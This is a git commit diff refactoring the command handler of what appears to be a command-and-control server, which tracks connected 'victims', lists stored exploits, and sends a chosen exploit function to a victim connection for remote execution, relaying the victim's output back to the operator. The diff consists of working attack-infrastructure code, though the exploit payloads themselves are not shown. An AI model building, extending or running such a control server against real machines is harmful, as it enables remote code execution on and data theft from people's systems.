ebedff7c711c020109b39fc48cd0dc1c0edf0826
Patrick Lynch <p@tricklynch.org>
2019-04-12 22:24:31 -0400

    Greatly improved how cmds are handled/implemented

--- server/server.js
+++ server/server.js
@@ -6,56 +6,61 @@ const client = require('./client')
 const exploits = require('./exploits')
 
 const victims = {}
+const cmds = {
+    'help': help,
+    'list': list,
+    'exploit': exploit
+}
 
-function handle_cmd(conn, cmd, args) {
-    // TODO Implement these in separate functions
-    // TODO Change cmds to an object like { 'func_name': func_ref }
-    // TODO Add an import command to allow importing custom exploits
-    const cmds = ['help', 'list', 'exploit']
-    switch(cmd) {
-        case 'help':
-            conn.send(cmds.join('|'))
+function help(conn) {
+    conn.send(Object.keys(cmds).join('|'))
+}
+
+function list(conn, args) {
+    const listables = ['victims', 'exploits']
+    if(args.length < 1) {
+        conn.send('Usage: list [' + listables.join('|') + ']')
+    }
+    switch(args[0]) {
+        case 'victims':
+            conn.send('' + Object.keys(victims))
             break
-        case 'list':
-            const listables = ['victims', 'exploits']
-            if(args.length < 1) {
-                conn.send('Usage: list [' + listables.join('|') + ']')
-            }
-            switch(args[0]) {
-                case 'victims':
-                    conn.send('' + Object.keys(victims))
-                    break
-                case 'exploits':
-                    conn.send('' + Object.keys(exploits))
-                    break
-                default:
-                    conn.send('The argument must be either "' + listables.join('" or "') + '"')
-                    break
-            }
-            break
-        case 'exploit':
-            if(args.length < 2) {
-                conn.send('Usage: exploit who what\r\nTo do what to who')
-                break
-            }
-            const who = args[0]
-            if(victims[who] == undefined || !Object.keys(victims).includes(who)) {
-                conn.send(who + ' is not a victim')
-                break
-            }
-            const what = args[1]
-            if(exploits[what] == undefined || !Object.keys(exploits).includes(what)) {
-                conn.send(what + ' is not an exploit')
-                break
-            }
-            const vic_conn = victims[who]
-            vic_conn.on('message', data => conn.send(data))
-            vic_conn.send('(' + exploits[what] + ')()')
-            console.log('Sent ' + what + ' to ' + who)
+        case 'exploits':
+            conn.send('' + Object.keys(exploits))
             break
         default:
-            conn.send('Implemented commands: ' + cmds.join(','))
+            conn.send('The argument must be either "' + listables.join('" or "') + '"')
             break
+    }
+}
+
+function exploit(conn, args) {
+    if(args.length < 2) {
+        conn.send('Usage: exploit who what\r\nTo do what to who')
+        return
+    }
+    const who = args[0]
+    if(victims[who] == undefined || !Object.keys(victims).includes(who)) {
+        conn.send(who + ' is not a victim')
+        return
+    }
+    const what = args[1]
+    if(exploits[what] == undefined || !Object.keys(exploits).includes(what)) {
+        conn.send(what + ' is not an exploit')
+        return
+    }
+    const vic_conn = victims[who]
+    vic_conn.on('message', data => conn.send(data))
+    vic_conn.send('(' + exploits[what] + ')()')
+    console.log('Sent ' + what + ' to ' + who)
+}
+
+function handle_cmd(conn, cmd, args) {
+    // TODO Add an import command to allow importing custom exploits
+    if(undefined === cmds[cmd]) {
+        conn.send('Implemented commands: ' + Object.keys(cmds).join(','))
+    } else {
+        cmds[cmd](conn, args)
     }
 }
 
